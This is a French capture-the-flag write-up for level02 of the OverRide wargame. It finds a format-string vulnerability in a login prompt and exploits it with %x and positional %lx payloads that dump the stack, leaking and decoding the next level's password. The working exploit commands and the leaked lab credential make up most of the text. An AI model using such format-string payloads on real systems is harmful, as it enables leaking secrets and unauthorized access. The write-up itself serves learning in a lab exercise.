@@ -1,0 +1,59 @@
+Si nous parvenons à remplir les différentes conditions, nous pourrons accéder aux instructions suivantes :
+
+---
+
+0x0000000000400a85 <+625>:	mov    edi,0x400d32
+0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>
+
+(gdb) x/s 0x400d32
+0x400d32:	 "/bin/sh
+
+---
+
+Seulement, la dernière condition à remplir est jsutement de connaitre le "/level3/.pass".
+
+Celui-ci est stocké sur la stack et permet la comparaison avec l'input de l'utilisateur.
+
+Nous n'avons aucun moyen de réécrire dessus (protégé par des fgets et buffers de bonnes tailles).
+
+Mais nous pouvons tenter de le lire. En effet, lorsque un utilisateur ne connait pas le PASSWORD un message de type suivant est affiché:
+
+{USER} does not have access!
+
+Or, {USER} est littéralement le premier input de l'utilisateur et est affiché via un printf.
+
+C'est donc ici que se trouve la faille. Tentons de l'exploiter :
+
+-----
+
+level02@OverRide:~$ (python -c 'print "%x-" * 33') | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+ffffe4d0-0-0-2a2a2a2a-2a2a2a2a-ffffe6c8-f7ff9a08-0-0-0-0-0-0-0-0-0-0-0-0-0-0-34376848-61733951-574e6758-6e475873-664b394d-0-252d7825-2d78252d-78252d78-252d7825-2d78252d-78252d78- does not have access!
+
+-----
+
+On reconnait ici notre série de "%x-" (252d78).
+
+"/level3/.pass" est stocké en 0x7fffffffe520 ([rbp -0xa0])
+Notre input est stocké après, en 0x7fffffffe550 ([rbp -0x70])
+
+Le .pass en hexa semble donc etre à partir du 22 eme "argument" :34376848-61733951-574e6758-6e475873-664b394d.
+Il manque cependant des caractères, puisque il est censé en avoir 40 (cf controle avec strcspn après le fread). Nous devons utiliser le modificateur "l" de printf (64 bits).
+
+---
+
+level02@OverRide:~$ (python -c 'print "%26$lx%25$lx%24$lx%23$lx%22$lx"') | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848 does not have access!
+
+level02@OverRide:~$ python -c 'print "48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848".decode("hex")[::-1]'
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
